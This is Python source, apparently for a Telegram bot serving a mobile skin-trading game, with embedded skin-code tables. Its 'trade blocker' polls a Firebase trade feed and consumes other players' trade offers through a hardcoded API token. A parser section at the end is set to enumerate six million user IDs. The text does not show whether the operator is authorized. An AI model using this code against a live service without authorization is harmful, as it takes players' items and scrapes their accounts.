Bratatat\nG1 | Negev CaliCamo\nBd | Negev Dazzle\nD9 | Negev Desert-Strike\nbK | Negev Drop Me\nL6 | Negev Lionfish\nC8 | Negev Loudmouth\nDS | Negev Man-o' -war\nGt | Negev Nuclear Waste\nCb | Negev Power Loader\nQo | Negev Prototype\nEc | Negev Terrain\ndU | Negev | Wall Bang \n===================\nR8 Revolver:\nbT | R8 Revolver  Banana Cannon\naL | R8 Revolver | Blaze\nXv | R8 Revolver | Junk Yard\nHC | R8 Revolver Amber Fade\nQm | R8 Revolver Bone Forged\nbB | R8 Revolver Crazy 8\nCg | R8 Revolver Crimson Web\nCV | R8 Revolver Fade\nL7 | R8 Revolver Grip\ncC | R8 Revolver Inlay\nLi | R8 Revolver Llama Cannon\nPg | R8 Revolver Memento\nBq | R8 Revolver Reboot\nN2 | R8 Revolver Skull Crusher\nMt | R8 Revolver Survivalist\ncw | R8 Revolver | Tango \n===================\nMP5-SD:\nTw | MP5-SD | Condition Zero\nS8 | MP5-SD | Kitbash\na3 | MP5-SD | Necro Jr.\nal | MP5-SD | Oxide Oasis\nPb | MP5-SD Acid Wash\nO3 | MP5-SD AGent\nOw | MP5-SD Co-Processor\nQn | MP5-SD Desert Strike\nN5 | MP5-SD Gauss\nbX | MP5-SD Liquidation\nNk | MP5-SD Phosphor\ncx | MP5-SD | Statics \ndi | MP5-SD | Savannah Halftone \ndS | MP5-SD | Neon Squeezer \n===================\nSticker:\nYo | Sticker Nice Clutch (Holo)\nYk | Sticker | Ace Devil (Foil)\nXf | Sticker | Astralis (Foil) | Atlanta 2017\nW3 | Sticker | Astralis (Foil) | Berlin 2019\nTH | Sticker | Astralis (Foil) | London 2018\nYl | Sticker | Bullet Hell (Foil)\nXR | Sticker | cajunb (Foil) | Atlanta 2017\nSM | Sticker | Cheongsam\nSK | Sticker | Cheongsam (Holo) \nSH | Sticker | Chicken Lover\nTI | Sticker | Cloud9 (Foil) | London 2018\nYw | Sticker | Clutch Or Kick\nYn | Sticker | Cyber Romanov (Holo)\nW4 | Sticker | device (Gold) | Berlin 2019\nTR | Sticker | Dirty Money\nSl | Sticker | Distinguished Master Guardian\nSc | Sticker | Distinguished Master Guardian (Holo)\nYz | Sticker | Dr. Dazzles\nTS | Sticker | Drug War Veteran\nXD | Sticker | dupreeh (Gold) | London 2018\nXJ | Sticker | ELEAGUE (Foil) | Atlanta 2017\naU | Sticker | electroNic (Gold) | Stockholm 2021\nXB | Sticker | EliGE (Gold) | Berlin 2019\nXT | Sticker | ESL (Foil) | Cologne 2015\nYr | Sticker | Eye Contact (Holo)\nYs | Sticker | EZ\nXC | Sticker | FACEIT (Foil) | London 2018\nSQ | Sticker | Fancy Koi\nSJ | Sticker | Fancy Koi (Foil)\nYu | Sticker | Fast Banana\nTJ | Sticker | FaZe Clan (Foil) | London 2018\nXG | Sticker | flamie (Gold) | London 2018\nXV | Sticker | flusha (Foil) | Cologne 2015\nXe | Sticker | Fnatic (Foil) | Atlanta 2017\nXU | Sticker | Fnatic (Foil) | Cologne 2015\nTK | Sticker | Fnatic (Foil) | London 2018\nX0 | Sticker | Fnatic (Holo) | Katowice 2014\nTT | Sticker | Fnatic | Katowice 2014\nXN | Sticker | G2 Esports (Foil) | Atlanta 2017\nTL | Sticker | G2 Esports (Foil) | London 2018\naZ | Sticker | G2 Esports (Foil) | Stockholm 2021\naX | Sticker | G2 Esports (Gold) | Stockholm 2021\nXE | Sticker | gla1ve (Gold) | London 2018\nSz | Sticker | Global Elite\nSf | Sticker | Gold Nova\nSZ | Sticker | Gold Nova (Holo)\nXc | Sticker | GuardiaN (Foil) | Cologne 2015\nXI | Sticker | GuardiaN (Gold) | London 2018\nSP | Sticker | Guardian Dragon\nWb | Sticker | Hamster Hawk\nYp | Sticker | Handle With Care (Holo)\nY1 | Sticker | Hard Carry\nTU | Sticker | HellRaisers | Katowice 2014\nSW | Sticker | Hotpot\naV | Sticker | huNter- (Gold) | Stockholm 2021\nYq | Sticker | I See You (Holo)\nXz | Sticker | iBUYPOWER (Holo) | Katowice 2014\nTW | Sticker | iBUYPOWER | Katowice 2014\nXW | Sticker | JW (Foil) | Cologne 2015\nXS | Sticker | k0nfig (Foil) | Atlanta 2017\nXY | Sticker | kennyS (Foil) | Cologne 2015\nTX | Sticker | Killjoy\nWe | Sticker | Killjoy (Holo)\nY0 | Sticker | Kitted Out\nSg | Sticker | Legendary Eagle\nSb | Sticker | Legendary Eagle (Holo)\nSm | Sticker | Legendary Eagle Master\nSa | Sticker | Legendary Eagle Master (Holo)\nSG | Sticker | Let's Roll-oll\nTY | Sticker | LGB eSports | Katowice 2014\nTZ | Sticker | Luck Skill\nTa | Sticker | Lucky 13\nSO | Sticker | Mahjong Fa\nSR | Sticker | Mahjong Rooster\nSN | Sticker | Mahjong Zhong\nWc | Sticker | Massive Pear\nSk | Sticker | Master Guardian\nSe | Sticker | Master Guardian (Holo)\nSi | Sticker | Master Guardian Elite\nSd | Sticker | Master Guardian Elite (Holo)\nSF | Sticker | Metal\nTQ | Sticker | MIBR (Foil) | London 2018\nTb | Sticker | Mister Chief\nTM | Sticker | mousesports (Foil) | London 2018\nWa | Sticker | Move It (Foil)\nY3 | Sticker | Nademan\nXa | Sticker | Natus Vincere (Foil) | Cologne 2015\nTN | Sticker | Natus Vincere (Foil) | London 2018\naY | Sticker | Natus Vincere (Foil) | Stockholm 2021\naW | Sticker | Natus Vincere (Gold) | Stockholm 2021\nXy | Sticker | Natus Vincere (Holo) | Katowice 2014\nTc | Sticker | Natus Vincere | Katowice 2014\nXZ | Sticker | NBK- (Foil) | Cologne 2015\naS | Sticker | NiKo (Gold) | Stockholm 2021\nTd | Sticker | Ninjas in Pyjamas | Katowice 2014\nYv | Sticker | No Time\nSS | Sticker | Noodles\nXQ | Sticker | North (Foil) | Atlanta 2017\nW6 | Sticker | NRG (Foil) | Berlin 2019\nXH | Sticker | olofmeister (Gold) | London 2018\nXM | Sticker | pashaBiceps (Foil) | Atlanta 2017\nYj | Sticker | Purrurists (Foil)\nY2 | Sticker | Retro Leet\nSU | Sticker | Rice Bomb\nYm | Sticker | Runtime (Holo)\nXF | Sticker | s1mple (Gold) | London 2018\naT | Sticker | s1mple (Gold) | Stockholm 2021\nXP | Sticker | ScreaM (Foil) | Atlanta 2017\nXO | Sticker | shox (Foil) | Atlanta 2017\nSh | Sticker | Silver\nSX | Sticker | Silver (Foil)\nXL | Sticker | Snax (Foil) | Atlanta 2017\nYx | Sticker | Speedy T\nW8 | Sticker | stanislaw (Gold) | Berlin 2019\nW2 | Sticker | StarLadder (Foil) | Berlin 2019\nTe | Sticker | Stay Frosty\nXA | Sticker | Stewie2K (Gold) | Berlin 2019\nSj | Sticker | Supreme Master First Class\nSY | Sticker | Supreme Master First Class (Holo)\nSy | Sticker | Tamara\nW7 | Sticker | tarik (Gold) | Berlin 2019\nX2 | Sticker | Team Dignitas (Holo) | Katowice 2014\nTf | Sticker | Team Dignitas | Katowice 2014\nXX | Sticker | Team EnVyUs (Foil) | Cologne 2015\nXd | Sticker | Team Liquid (Foil) | Atlanta 2017\nW9 | Sticker | Team Liquid (Foil) | Berlin 2019\nTP | Sticker | Team Liquid (Foil) | London 2018\nSV | Sticker | Terror Rice\nYt | Sticker | This Is Fine (CT)\nX1 | Sticker | Titan (Holo) | Katowice 2014\nTg | Sticker | Titan | Katowice 2014\nST | Sticker | Toy Tiger\nTh | Sticker | Trick Or Threat\nXK | Sticker | Virtus.Pro (Foil) | Atlanta 2017\nXx | Sticker | Virtus.Pro (Holo) | Katowice 2014\nTi | Sticker | Virtus.Pro | Katowice 2014\nYy | Sticker | War\nSL | Sticker | Water Gun\nTO | Sticker | Winstrike Team (Foil) | London 2018\nTj | Sticker | Witch\nW5 | Sticker | Xyp9x (Gold) | Berlin 2019\nXb | Sticker | Zeus (Foil) | Cologne 2015\nQ9 | Sticker All Hail The King (Foil)\nLw | Sticker Awp Country\nRL | Sticker Aztec\nbv | Sticker B Hop\nbr | Sticker Baby Cerberus\nbs | Sticker Baby Fire Serpent\nbo | Sticker Baby Howl\nbq | Sticker Baby Lore\nbp | Sticker Baby Medusa\nRf | Sticker Baited\nRV | Sticker Baited (Holo)\nSC | Sticker Banana\nR7 | Sticker Bash (Holo)\nQ4 | Sticker Bish (Holo)\nRg | Sticker Bite Me\nRU | Sticker Bite Me (Foil)\nbi | Sticker Blue Gem (Glitter)\nHh | Sticker Bomb Code\nQw | Sticker Bomb Doge\nRC | Sticker Boost (Holo)\nR8 | Sticker Bosh (Holo)\nRs | Sticker Bullet Rain\nRk | Sticker Bullet Rain (Foil)\nRu | Sticker Camper\nRl | Sticker Camper (Foil) \nbl | Sticker Cbbl (Holo)\nRe | Sticker Cluck\nRY | Sticker Cluck (Holo)\nRF | Sticker Clutchman (Holo)\nbm | Sticker Conspiracy Club (Holo)\nHp | Sticker Crown (Foil)\nRE | Sticker CS20 Classic (Holo)\nRw | Sticker Dessert Eagle\nRt | Sticker Devouring Flame\nRm | Sticker Devouring Flame (Holo)\nbf | Sticker DJ Safecracker (Lenticular)\nRA | Sticker Door Stuck (Foil)\nQz | Sticker Dragon Lore (Foil)\nHb | Sticker Easy Peasy\nHi | Sticker Eco Rust\nRv | Sticker Entry Fragger\nRD | Sticker Fire in the Hole (Holo)\nQ8 | Sticker Firestarter (Holo)\nRb | Sticker First Blood\nRW | Sticker First Blood (Holo)\nQ0 | Sticker Flammable (Foil)\nHg | Sticker Flickshot\nRj | Sticker Free Hugs\nRZ | Sticker Free Hugs (Holo) тут токсик фоил\nRK | Sticker Friend Code\nRr | Sticker Friendly Fire\nRo | Sticker Friendly Fire (Holo)\nQ1 | Sticker Global Elite (Foil)\nQ2 | Sticker Gold Web (Foil)\nHd | Sticker Good Game\nSD | Sticker Good Luck\nRG | Sticker Guinea Pig (Holo)\nSE | Sticker Have Fun\nTV | Sticker Ho Ho Ho\nMc | Sticker Howling Dawn\nbh | Sticker In The Fire (Foil)\nQ5 | Sticker Incineration (Holo)\nbu | Sticker Infinite Diamond (Holo)\nR5 | Sticker Ivette\nRy | Sticker Ivette (Holo)\nbj | Sticker Kawaii CT(Holo)\nbk | Sticker Kawaii T(Holo)\nR4 | Sticker Kimberly\nR0 | Sticker Kimberly (Holo) тут\nQv | Sticker Lambda (Holo)\nR9 | Sticker Let's Roll-oll (Holo)\nRc | Sticker Lurker\nRT | Sticker Lurker (Foil)\nR6 | Sticker Martha\nR2 | Sticker Martha (Holo)\nHm | Sticker Merietta\nR1 | Sticker Merietta (Holo) \nRR | Sticker Mondays\nQ3 | Sticker New Sheriff (Foil)\nSB | Sticker Nice Shot\nHo | Sticker Ninja Defuse\nRI | Sticker Nuke Beast\nRP | Sticker Obey SAS\nRi | Sticker One Sting\nRX | Sticker One Sting (Holo)\nbn | Sticker Pain Train (Holo)\nHc | Sticker Pigeon Master\nRM | Sticker Pixel Avenger\nHf | Sticker Pros Don't Fake\nRx | Sticker Retake Expert\nRp | Sticker Retake Expert (Holo) \nRB | Sticker Rush 4x20 (Holo) \nQx | Sticker SAS Chicken\nRh | Sticker Scavenger\nRa | Sticker Scavenger (Holo)\nRN | Sticker Separate Pixels\nRz | Sticker Sherry (Holo)\nR3 | Sticker Sherry (Holo)\nbg | Sticker Showdown (Foil)\nRq | Sticker Small Arms\nRn | Sticker Small Arms (Holo)\nHs | Sticker Stupid Banana (Foil)\nRJ | Sticker Surf's Up\nHr | Sticker Swag (Foil)\nQ6 | Sticker Tamara (Holo)\nRQ | Sticker Temperance\nHj | Sticker Terrorized\nHl | Sticker The Awper\nHk | Sticker The Fragger\nHq | Sticker The Pro (Foil)\nbt | Sticker This is Fine (H)\nbw | Sticker This is Fine (T)\nHe | Sticker Thug Life\nRO | Sticker Too Late\nRH | Sticker Too Old for This\nRd | Sticker Toxic\nRS | Sticker Toxic (Foil)\nbe | Sticker TV Installation (Lenticular)\nQ7 | Sticker Unicorn (Holo)\nSA | Sticker Welcome to The Clutch\nQy | Sticker Winged Defuser\nSI | Sticker Guardian Dragon (Foil)\n===================\n"
EMBEDDED_MODIFIERS_TEXT = "import modifikators\n    #Редкость скина проевляется от его модификатора\n    #Модификатор скина нужен в самом скрипте, но некак не проевляется  в игре\n    #Данная таблица упращает поиск нужного модификатора.\n              \n              \n       \n            {#Сами модификаторы\"}\n    //10 {\"ПОНОШЕННОЕ}\"\n«10» = [поношенное]\n«12» = (Сувенирный)-[поношенное]\n«14» = {Стартрек}-[поношенное]\n«16» = {Стартрек} (Сувенирный)-[поношенное]\n\n    //20 _ \"{ПОСЛЕ ПОЛЕВЫХ ИСПЫТАНИЙ}\"\n«20» = [после полевых испытаний]\n«22» = (Сувенирный)-[после полевых испытаний]\n«24» = {Стартрек}-[после полевых испытаний]\n«26» = {Стартрек} (Сувенирный)-[после полевых испытаний]\n \n  //30 _ \"{НЕМНОГО ПОНОШЕННОЕ}\"\n«30» = [немного поношенное]\n«32» = (Сувенирный)-[немного поношенное]\n«34» = {Стартрек}-[немного поношенное]  \n«36» = {Стартрек} (Сувенирный)-[немного поношенное]\n\n//40 _ \"{ПРЯМО С ЗАВОДА}\"\n«40» = [прямо с завода]\n«42» = (Сувенирный)-[прямо с завода]\n«44» = {Стартрек}-[прямо с завода]  \n«46» = {Стартрек} (Сувенирный)-[прямо с завода]"
# ======================================

def load_json(path, default=None):
    if default is None:
        default = {}
    try:
        if not os.path.exists(path):
            parent = os.path.dirname(path)
            if parent:
                os.makedirs(parent, exist_ok=True)
            return default.copy() if isinstance(default, (dict, list)) else default
        with open(path, 'r', encoding='utf-8') as f:
            data = json.load(f)
        return data if data is not None else (default.copy() if isinstance(default, (dict, list)) else default)
    except Exception as e:
        logger.error(f"Ошибка загрузки JSON {path}: {e}")
        return default.copy() if isinstance(default, (dict, list)) else default


def save_json(path, data):
    try:
        parent = os.path.dirname(path)
        if parent:
            os.makedirs(parent, exist_ok=True)
        with open(path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        return True
    except Exception as e:
        logger.error(f"Ошибка сохранения JSON {path}: {e}")
        return False


# Встроенные модули из бывшей папки scripts


# ===== INLINED FROM scripts/trade_blocker.py =====
import asyncio
import json
import os
import time
import re
from typing import Dict, Set, Optional, Tuple, List
from datetime import datetime, timedelta, timezone

import requests
from telegram import Bot, Update
from telegram.ext import ContextTypes

# ================= НАСТРОЙКИ =================
API_BASE_URL = "https://api.efezgames.com/v1"
FIREBASE_URL = "https://api-project-7952672729.firebaseio.com"
CHECK_INTERVAL = 1  # секунд
LOG_FILE = "logs/TRADElogs.json"
CREATE_TOKEN = os.getenv("CREATE_TOKEN", "")  # токен для создания трейдов
DEFAULT_SENDER_ID = "EfezAdmin1"       # аккаунт-отправитель для выводов
SKINS_DIR = "skins"
SKINS_LOG_FILE = os.path.join(SKINS_DIR, "skin.json")
SKINS_MAP_FILE = "айди скинов.txt"
WHITETRADE_FILE = os.path.join(PLAYER_DATA_DIR, "whitetrade.json")

# Чаты для уведомлений о выводах
WITHDRAW_NOTIFY_CHAT = -1003534308756
WITHDRAW_NOTIFY_THREAD = 10579
WITHDRAW_EXPIRE_HOURS = 48
# ==============================================

# Глобальные переменные модуля
_blocker_task: Optional[asyncio.Task] = None
_blocker_running = False
_blocked_count = 0
_notify_bot: Optional[Bot] = None
_notify_chat_id: Optional[int] = None
_notify_thread_id: Optional[int] = None

# Множество уже обработанных (заблокированных) ID трейдов (загружается из лога)
_seen_ids: Set[str] = set()
# Белый список трейдов (свои, не блокировать)
_whitelist: Dict[str, dict] = {}        # trade_id -> данные
_whitelist_messages: Dict[str, str] = {} # сообщение -> trade_id
# Словарь для связи message_id уведомления с trade_id (для разблокировки)
_trade_id_by_msg_id: Dict[int, str] = {}
# Словарь с полными данными трейда по его ID (для разблокировки)
_all_trades_data: Dict[str, dict] = {}

# Маппинг кодов скинов -> названия
_skin_map: Dict[str, str] = {}

def _load_skin_map() -> Dict[str, str]:
    """Загружает соответствие кодов скинов и названий из встроенного текста."""
    skin_map = {}
    try:
        for raw_line in EMBEDDED_SKINS_TEXT.splitlines():
            line = raw_line.strip()
            if not line or '|' not in line:
                continue
            parts = line.split('|', 1)
            code = parts[0].strip()
            name = parts[1].strip() if len(parts) > 1 else code
            code = code[:2]
            skin_map[code] = name
    except Exception as e:
        print(f"Ошибка загрузки встроенной карты скинов: {e}")
    return skin_map

def _parse_skin_codes(skins_str: str) -> List[str]:
    if not skins_str:
        return []
    if ';' in skins_str:
        parts = skins_str.split(';')
    elif ',' in skins_str:
        parts = skins_str.split(',')
    else:
        parts = [skins_str]
    codes = []
    for p in parts:
        p = p.strip()
        if len(p) >= 2:
            codes.append(p[:2])
    return codes

def _get_skin_name(code: str) -> str:
    return _skin_map.get(code, code)

def _save_skins_to_log(trade_id: str, trade_data: dict):
    os.makedirs(SKINS_DIR, exist_ok=True)
    now_msk = datetime.now(timezone.utc).astimezone(timezone(timedelta(hours=3)))
    timestamp = now_msk.strftime("%Y-%m-%d %H:%M:%S")

    skins_offered = trade_data.get('skinsOffered', '')
    skins_requested = trade_data.get('skinsRequested', '')
    offered_codes = _parse_skin_codes(skins_offered)
    requested_codes = _parse_skin_codes(skins_requested)

    entry = {
        "trade_id": trade_id,
        "timestamp": timestamp,
        "skins_offered": [{"code": c, "name": _get_skin_name(c)} for c in offered_codes],
        "skins_requested": [{"code": c, "name": _get_skin_name(c)} for c in requested_codes]
    }

    if os.path.exists(SKINS_LOG_FILE):
        try:
            with open(SKINS_LOG_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                if not isinstance(data, list):
                    data = []
        except:
            data = []
    else:
        data = []
    data.append(entry)
    try:
        with open(SKINS_LOG_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    except Exception as e:
        print(f"Ошибка сохранения лога скинов: {e}")

def _load_blocked_ids() -> Set[str]:
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
            return set(data.keys())
        except:
            return set()
    return set()

def _save_trade_to_log(trade_id: str, trade_data: dict):
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
        except:
            data = {}
    else:
        data = {}
    data[trade_id] = trade_data
    try:
        with open(LOG_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    except Exception as e:
        print(f"Ошибка сохранения лога трейдов: {e}")

def load_whitelist():
    global _whitelist, _whitelist_messages
    if os.path.exists(WHITETRADE_FILE):
        try:
            with open(WHITETRADE_FILE, 'r', encoding='utf-8') as f:
                _whitelist = json.load(f)
                for tid, data in _whitelist.items():
                    msg = data.get('message')
                    if msg:
                        _whitelist_messages[msg] = tid
        except Exception as e:
            print(f"Ошибка загрузки whitelist: {e}")
            _whitelist = {}
            _whitelist_messages = {}
    else:
        _whitelist = {}
        _whitelist_messages = {}

def save_whitelist():
    try:
        with open(WHITETRADE_FILE, 'w', encoding='utf-8') as f:
            json.dump(_whitelist, f, indent=2, ensure_ascii=False)
    except Exception as e:
        print(f"Ошибка сохранения whitelist: {e}")

def add_to_whitelist(trade_id: str, message: str, receiver_game_id: str, skins_offered: str, notification_msg_id: int = None):
    _whitelist[trade_id] = {
        "message": message,
        "receiver_game_id": receiver_game_id,
        "skins_offered": skins_offered,
        "timestamp": datetime.now().isoformat(),
        "notification_msg_id": notification_msg_id,
        "completed": False
    }
    _whitelist_messages[message] = trade_id
    save_whitelist()

async def _notify_trade_accepted(trade_id: str, data: dict):
    if not _notify_bot:
        return
    msg_id = data.get('notification_msg_id')
    if not msg_id:
        return
    try:
        await _notify_bot.send_message(
            chat_id=WITHDRAW_NOTIFY_CHAT,
            text=(
                f"<tg-emoji emoji-id=\"5274099962655816924\">❗</tg-emoji> <b>Трейд был принят!</b>\n"
                f"- Время создания: {data['timestamp']}"
            ),
            message_thread_id=WITHDRAW_NOTIFY_THREAD,
            reply_to_message_id=msg_id,
            parse_mode='HTML'
        )
    except Exception as e:
        print(f"Ошибка уведомления о принятии трейда: {e}")

async def _recreate_trade(trade_id: str, data: dict):
    url = f"{API_BASE_URL}/trades/createOffer"
    params = {
        "token": CREATE_TOKEN,
        "playerID": data['receiver_game_id'],          # ID получателя (игрока)
        "receiverID": "",                               # не используется
        "senderNick": "EfezBot",                        # отправитель (бот)
        "senderFrame": "",
        "senderAvatar": "",
        "receiverNick": "",
        "receiverFrame": "",
        "receiverAvatar": "",
        "skinsOffered": data['skins_offered'],
        "skinsRequested": "",
        "message": data['message'],
        "pricesHash": "fbd9aec4384456124c0765581a4ba099",
        "receiverOneSignal": "",
        "senderOneSignal": "",
        "senderVersion": "2.40.0",
        "receiverVersion": "2.40.0"
    }
    try:
        resp = requests.get(url, params=params, timeout=10)
        if resp.status_code == 200:
            resp_json = resp.json()
            new_trade_id = resp_json.get('offerID') or resp_json.get('_id')
            if new_trade_id:
                # Отправляем уведомление о пересоздании
                await _notify_bot.send_message(
                    chat_id=WITHDRAW_NOTIFY_CHAT,
                    text=f"🔄 Трейд пересоздан (не был принят за {WITHDRAW_EXPIRE_HOURS} часов). Новый ID: {new_trade_id}",
                    message_thread_id=WITHDRAW_NOTIFY_THREAD,
                    reply_to_message_id=data.get('notification_msg_id')
                )
                # Добавляем новый трейд в whitelist
                add_to_whitelist(new_trade_id, data['message'], data['receiver_game_id'], data['skins_offered'], data.get('notification_msg_id'))
    except Exception as e:
        print(f"Ошибка пересоздания трейда: {e}")

async def _check_whitelist():
    now = datetime.now()
    expire_threshold = timedelta(hours=WITHDRAW_EXPIRE_HOURS)
    to_delete = []
    for trade_id, data in list(_whitelist.items()):
        if data.get('completed'):
            continue
        created = datetime.fromisoformat(data['timestamp'])
        age = now - created
        # Проверяем наличие трейда в Firebase
        url = f"{FIREBASE_URL}/Trades/{trade_id}.json"
        try:
            resp = requests.get(url, timeout=5)
            trade_exists = (resp.status_code == 200 and resp.json() is not None)
        except:
            trade_exists = True  # при ошибке временно считаем существующим

        if not trade_exists:
            # Трейд принят
            await _notify_trade_accepted(trade_id, data)
            data['completed'] = True
            to_delete.append(trade_id)
        elif age > expire_threshold:
            # Трейд висит слишком долго – пересоздаём
            await _recreate_trade(trade_id, data)
            data['completed'] = True
            to_delete.append(trade_id)

    if to_delete:
        for tid in to_delete:
            msg = _whitelist[tid].get('message')
            if msg and msg in _whitelist_messages:
                del _whitelist_messages[msg]
            del _whitelist[tid]
        save_whitelist()

async def _send_notification(trade_id: str, trade_data: dict):
    if not _notify_bot or not _notify_chat_id:
        return

    ts = trade_data.get('ts', 0)
    if ts:
        time_str = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(ts / 1000))
    else:
        time_str = 'неизвестно'
    message = trade_data.get('message', '')
    sender_nick = trade_data.get('senderNick', 'неизвестно')
    receiver_nick = trade_data.get('receiverNick', 'неизвестно')
    skins_offered = trade_data.get('skinsOffered', '')
    skins_requested = trade_data.get('skinsRequested', '')
    sender_id = trade_data.get('senderID', 'неизвестно')
    receiver_id = trade_data.get('receiverID', 'неизвестно')

    text = (
        f"✅ Трейд: {trade_id} - заблокирован\n"
        f"• Время отправки трейда: {time_str}\n"
        f"• Сообщение трейда: {message}\n"
        f"• Ник отправителя: {sender_nick}\n"
        f"• Ник получателя: {receiver_nick}\n"
        f"Скины\n"
        f"• Отправляемые скины: {skins_offered}\n"
        f"• Получаемые скины: {skins_requested}\n"
        f"Айди\n"
        f"• Айди отправителя: {sender_id}\n"
        f"• Айди получателя: {receiver_id}\n"
        f"---\n"
        f"| Информация\n"
        f"Чтобы разблокировать трейд ответьте на это или другое сообщение словом \"разблокировать\""
    )

    try:
        sent_msg = await _notify_bot.send_message(
            chat_id=_notify_chat_id,
            text=text,
            message_thread_id=_notify_thread_id
        )
        _trade_id_by_msg_id[sent_msg.message_id] = trade_id
        _all_trades_data[trade_id] = trade_data
    except Exception as e:
        print(f"Ошибка отправки уведомления о трейде: {e}")

async def _blocker_worker():
    global _blocked_count, _seen_ids
    check_counter = 0

    while _blocker_running:
        try:
            url = f"{FIREBASE_URL}/Trades.json?orderBy=\"ts\"&limitToLast=20"
            response = requests.get(url, timeout=5)
            trades = response.json()
            if not trades:
                await asyncio.sleep(CHECK_INTERVAL)
                continue

            for trade_id, trade_data in trades.items():
                if trade_id in _seen_ids:
                    continue
                if trade_id in _whitelist:
                    # свой трейд, не блокируем
                    _seen_ids.add(trade_id)
                    continue

                # Проверяем сообщение на совпадение с белым списком
                msg_text = trade_data.get('message', '')
                if msg_text in _whitelist_messages and _whitelist_messages[msg_text] != trade_id:
                    # Кто-то отправил трейд с таким же сообщением - блокируем (обычная логика)
                    pass

                sender_id = trade_data.get('senderID')
                if sender_id:
                    accept_url = f"{API_BASE_URL}/trades/consumeOffer?token=besttoken&playerID={sender_id}&offerID={trade_id}"
                    try:
                        accept_resp = requests.get(accept_url, timeout=3)
                        if accept_resp.status_code == 200:
                            _blocked_count += 1
                            print(f"Трейд {trade_id} успешно принят")
                        else:
                            print(f"Ошибка принятия трейда {trade_id}: {accept_resp.status_code}")
                    except Exception as e:
                        print(f"Исключение при принятии трейда {trade_id}: {e}")

                    _seen_ids.add(trade_id)
                    _save_trade_to_log(trade_id, trade_data)
                    _save_skins_to_log(trade_id, trade_data)
                    await _send_notification(trade_id, trade_data)

            # Раз в минуту проверяем белый список
            check_counter += 1
            if check_counter >= 60:
                await _check_whitelist()
                check_counter = 0

            await asyncio.sleep(CHECK_INTERVAL)
        except Exception as e:
            print(f"Ошибка в блокировщике трейдов: {e}")
            await asyncio.sleep(5)

def start_blocker(bot: Bot, chat_id: int, thread_id: Optional[int], active_tasks: dict):
    global _blocker_task, _blocker_running, _notify_bot, _notify_chat_id, _notify_thread_id, _seen_ids, _skin_map
    if _blocker_running:
        return
    _skin_map = _load_skin_map()
    load_whitelist()
    _notify_bot = bot
    _notify_chat_id = chat_id
    _notify_thread_id = thread_id
    _seen_ids = _load_blocked_ids()
    _blocked_count = len(_seen_ids)
    _blocker_running = True
    _blocker_task = asyncio.create_task(_blocker_worker())
    active_tasks["TradeBlocker"] = _blocker_task

def stop_blocker() -> bool:
    global _blocker_task, _blocker_running
    if not _blocker_running or not _blocker_task:
        return False
    _blocker_running = False
    _blocker_task.cancel()
    return True

def blocker_is_running() -> bool:
    return _blocker_running

def get_blocker_stats() -> Dict:
    return {
        "blocked": _blocked_count,
        "running": _blocker_running
    }

def _send_create_offer(trade_data: dict) -> Tuple[bool, str, Optional[str]]:
    url = f"{API_BASE_URL}/trades/createOffer"
    params = {
        "token": CREATE_TOKEN,
        "playerID": trade_data.get('receiverID', ''),  # ID получателя (оригинальный)
        "receiverID": "",                               # не используется
        "senderNick": "EfezBot",                        # отправитель (бот)
        "senderFrame": trade_data.get('senderFrame', ''),
        "senderAvatar": trade_data.get('senderAvatar', ''),
        "receiverNick": trade_data.get('receiverNick', ''),
        "receiverFrame": trade_data.get('receiverFrame', ''),
        "receiverAvatar": trade_data.get('receiverAvatar', ''),
        "skinsOffered": trade_data.get('skinsOffered', ''),
        "skinsRequested": trade_data.get('skinsRequested', ''),
        "message": trade_data.get('message', ''),
        "pricesHash": trade_data.get('pricesHash', 'fbd9aec4384456124c0765581a4ba099'),
        "receiverOneSignal": trade_data.get('receiverOneSignal', ''),
        "senderOneSignal": trade_data.get('senderOneSignal', ''),
        "senderVersion": trade_data.get('senderVersion', '2.37.0'),
        "receiverVersion": trade_data.get('receiverVersion', '2.37.0')
    }
    try:
        response = requests.get(url, params=params, timeout=10)
        if response.status_code == 200:
            resp_json = response.json()
            new_trade_id = resp_json.get('offerID') or resp_json.get('_id') or resp_json.get('id')
            if not new_trade_id:
                new_trade_id = None
            return True, response.text, new_trade_id
        else:
            return False, f"HTTP {response.status_code}\n{response.text}", None
    except Exception as e:
        return False, str(e), None

async def handle_unblock_reply(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    if not update.message.reply_to_message:
        return False
    if update.message.reply_to_message.from_user.id != context.bot.id:
        return False

    replied_msg = update.message.reply_to_message
    msg_id = replied_msg.message_id

    if msg_id not in _trade_id_by_msg_id:
        return False

    text = update.message.text.strip().lower()
    if "разблокировать" not in text:
        return False

    trade_id = _trade_id_by_msg_id[msg_id]
    trade_data = _all_trades_data.get(trade_id)
    if not trade_data:
        await update.message.reply_text("❌ Данные трейда не найдены.")
        return True

    success, result_msg, new_trade_id = _send_create_offer(trade_data)
    if success:
        reply = f"✅ Трейд {trade_id} разблокирован (отправлен повторно)."
        if new_trade_id:
            reply += f"\nНовый ID трейда: {new_trade_id}"
            # добавляем новый трейд в белый список
            add_to_whitelist(new_trade_id, trade_data.get('message', ''), trade_data.get('receiverID', ''), trade_data.get('skinsOffered', ''))
        await update.message.reply_text(reply)
    else:
        await update.message.reply_text(f"❌ Ошибка при отправке трейда:\n{result_msg}")
    return True

__all__ = [
    'start_blocker',
    'stop_blocker',
    'get_blocker_stats',
    'blocker_is_running',
    'handle_unblock_reply',
    'add_to_whitelist'
  ]
# ===== END INLINED scripts/{name} =====



# ===== INLINED FROM scripts/parser.py =====
import requests
import csv
import os
import time
import threading
import random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, Any

# ========== НАСТРОЙКИ ==========
URL_FIND = "https://api.efezgames.com/v1/social/findUser"
URL_CHECK = "https://api.efezgames.com/v1/equipment/getEQ"

# Диапазон генерации
ID_RANGE_START = 1
ID_RANGE_END = 6000000

# Потоки для producer (поиск ID)
PRODUCER_THREADS = 10

# Потоки для consumer (обработка стран)
CONSUMER_THREADS = 50
